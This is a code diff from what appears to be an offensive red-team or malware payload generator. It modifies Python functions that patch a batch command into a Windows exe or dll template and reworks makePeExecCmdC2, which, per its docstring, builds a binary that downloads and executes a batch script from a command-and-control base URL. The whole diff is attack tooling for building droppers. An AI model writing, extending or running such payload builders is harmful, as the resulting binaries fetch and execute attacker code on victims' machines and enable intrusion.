@@ -5,6 +5,7 @@ import logging
 from typing import List
 import argparse
 import struct 
+import urllib
 
 from model import *
 from helpers import *
@@ -15,15 +16,15 @@ from make.powershell.powershell import *
 def makePeExecCmd(bat: str, asDll: bool) -> AceBytes:
     """Returns an exe/dll which will execute input as bat"""
     if asDll:
-        template = 'payloads/execc2cmd.dll'
+        template = 'payloads/execcmd.dll'
     else:
-        template = 'payloads/execc2cmd.exe'
+        template = 'payloads/execcmd.exe'
     placeholderLen = 800
     if len(bat) > placeholderLen:
         raise Exception("  Input larger than {} bytes, template too small".format(placeholderLen))
 
     placeholder = b" " * placeholderLen
-    exchange = bat + " " * (placeholderLen - len(bat))
+    exchange = bat.encode('utf-8') + b" " * (placeholderLen - len(bat))
 
     file = open(template, 'rb')
     data = file.read()
@@ -34,8 +35,13 @@ def makePeExecCmd(bat: str, asDll: bool) -> AceBytes:
 
 
 @DataTracker
-def makePeExecCmdC2(host: str, port: str, url: str, asDll: bool) -> AceBytes:
-    """Returns an exe/dll which will download & exec bat from host:port/url"""
+def makePeExecCmdC2(baseUrl: str, url: str, asDll: bool) -> AceBytes:
+    """Returns an exe/dll which will download & exec bat from baseUrl/url"""
+
+    parsed_url = urllib.parse.urlparse(baseUrl)
+    host = parsed_url.hostname
+    port = parsed_url.port
+
     if asDll:
         template = 'payloads/execc2cmd.dll'
     else:
